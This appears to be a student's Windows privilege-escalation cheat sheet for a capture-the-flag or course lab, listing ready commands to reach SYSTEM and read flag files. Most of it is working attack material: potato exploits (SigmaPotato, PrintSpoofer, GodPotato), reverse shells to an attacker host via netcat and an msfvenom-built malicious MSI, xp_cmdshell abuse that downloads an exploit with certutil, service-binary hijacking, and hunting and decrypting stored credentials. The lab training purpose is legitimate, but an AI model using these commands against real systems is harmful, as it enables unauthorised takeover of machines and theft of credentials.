# 04 — Windows Privilege Escalation  (intermediate + hard live here)

**FIRST COMMAND, ALWAYS:** `whoami /priv`. The one line that decides everything.

```cmd
whoami /priv
whoami /groups
```
| You see | Jump to | Note |
|---------|---------|------|
| **SeImpersonatePrivilege** | §1 ⭐ Potato | service accts (`svc_*`, `iis apppool\*`, `nt service\*`) almost always have it |
| SeAssignPrimaryToken | §1 Potato | same family |
| SeBackup / SeRestore | §6 | read any file / registry hives (SAM) |
| Admin but not SYSTEM | §1 or `PsExec -s` | getsystem |
| nothing special | §2–§5 | hunt tasks / services / installs |

## §1 ⭐ SeImpersonate → SigmaPotato → SYSTEM  (THE path — try this first)
```cmd
whoami /priv            REM confirm SeImpersonatePrivilege = Enabled (or present)
```
Upload SigmaPotato (see `07` for transfer), then one of:
```cmd
REM direct reverse shell as SYSTEM (listener on 5555 first):
SigmaPotato.exe --revshell LHOST 5555

REM or run a single command as SYSTEM:
SigmaPotato.exe --cmd "cmd /c type C:\Users\Administrator\Desktop\flag_hard.txt"
SigmaPotato.exe --cmd "cmd /c whoami"
```
Alternatives (same trick, if SigmaPotato is AV-flagged or fails):
```cmd
PrintSpoofer64.exe -i -c cmd.exe           REM interactive SYSTEM shell
PrintSpoofer64.exe -c "nc.exe LHOST 5555 -e cmd.exe"
GodPotato-NET4.exe -cmd "cmd /c whoami"    REM match the .NET version present
```
→ As SYSTEM: `type C:\Users\Administrator\Desktop\flag_hard.txt` (or search, see bottom).

## §2 Scheduled-task / service token-context hijack  (Tut9 Caldera)
A privileged task runs a script/exe you can overwrite → your potato runs in THAT token.
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As Next"
REM find a task running as SYSTEM/admin whose target file YOU can write:
icacls "C:\path\to\task-script.ps1"        REM look for (M)/(W)/(F) for your user/Users
```
Overwrite the target with your payload (reverse shell or potato call), wait for the trigger.
**Offline credential recovery** (SecureString/DPAPI found in a script/task):
```powershell
$sec = '01000000d08c9ddf...' | ConvertTo-SecureString   # DPAPI blob (runs as that user)
[Runtime.InteropServices.Marshal]::PtrToStringAuto(
  [Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec))
```

## §3 Writable service binary  (Tut7/8 STARLIGHT, Tut10 HarborWatch)
```cmd
REM find services; check the ones that aren't Windows built-ins:
sc.exe query state= all | findstr SERVICE_NAME
sc.exe qc <SvcName>                          REM BINARY_PATH_NAME + SERVICE_START_NAME (runs as?)
icacls "C:\Path\To\service.exe"              REM can your user write it? (M)/(W)/(F)
```
If writable: replace it with your payload exe, then restart:
```cmd
copy /Y payload.exe "C:\Path\To\service.exe"
sc.exe stop <SvcName> & sc.exe start <SvcName>
REM no restart rights? check: can you  sc config <Svc> binPath= ...  or  reboot-triggered start?
```
Also check **unquoted service paths**:
```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """
REM C:\Program Files\Some Dir\svc.exe  -> drop C:\Program.exe  (if writable)
```

## §4 AlwaysInstallElevated  (Tut7/8 CYCLES)
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
REM both = 0x1 ?  build + run a malicious MSI:
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=5555 -f msi -o payloads/evil.msi
# transfer, then on target:
```
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

## §5 MSSQL xp_cmdshell → SeImpersonate  (Tut10 Charlice)
SQL service account (`nt service\mssqlserver`) holds SeImpersonate → straight to §1.
```bash
sqsh -S $RHOST -U <user> -P '<pass>'      # or impacket-mssqlclient user:'pass'@$RHOST
```
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /priv';
go
EXEC xp_cmdshell 'certutil -urlcache -f http://LHOST:8081/SigmaPotato.exe C:\Windows\Temp\sp.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\sp.exe --revshell LHOST 5555';
go
```

## §6 Fast enumeration helpers + credential hunting
```cmd
REM creds & history (Tut10 — PowerShell history leaks passwords):
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
findstr /si password *.txt *.ini *.config *.xml *.ps1 2>nul
reg query HKLM /f password /t REG_SZ /s 2>nul
REM one-shot enum (upload winPEAS, see 07):
winPEASx64.exe quiet
```

## Find & read the flags (as SYSTEM/admin)
```cmd
type C:\Users\Administrator\Desktop\flag_hard.txt
dir /s /b C:\Users\*flag*.txt
where /r C:\ flag_*.txt
powershell -c "Get-ChildItem C:\ -Recurse -Filter *flag*.txt -ErrorAction SilentlyContinue"
```

## Gotchas
- **`whoami /priv` first** — don't enumerate blind. SeImpersonate present ⇒ you're basically done.
- Service accounts are the shortcut: IIS, MSSQL, most `svc_*` → SeImpersonate → Potato.
- Reverse shell for the SYSTEM catch uses **5555** (keep 4444 = foothold). Spare = 6666.
- Match GodPotato/.NET version to the box; if one potato is AV-killed, try another (Sigma/PrintSpoofer).
- Privesc is MANUAL for bonus marks — **don't** spend the one MSF use here.
